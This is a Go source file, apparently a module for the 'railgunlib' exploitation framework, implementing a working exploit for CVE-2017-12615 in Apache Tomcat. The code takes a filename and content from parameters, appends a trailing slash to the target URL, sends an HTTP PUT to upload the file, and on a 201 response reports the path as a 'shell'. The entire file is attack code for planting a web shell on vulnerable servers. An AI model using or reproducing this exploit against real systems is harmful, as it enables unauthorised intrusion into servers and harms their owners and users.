package exp_Tomcat

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_CVE_2017_12615 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2017_12615) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 构造数据
	headers := self.GetInitExpHeaders()

	url := self.Params.BaseParam.Target
	if filename != "" {
		url = url + filename
	}
	accessUrl := url
	url = strings.TrimRight(url, "/") + "/"

	// 发送请求
	httpresp := self.HttpPutWithoutRedirect(url, content, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	if httpresp.Resp.StatusCode == 201 {
		expResult.Status = true
		self.EchoSuccessMsg("shell: " + accessUrl)
	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2017_12615{}, "exp_CVE_2017_12615.yml")
}
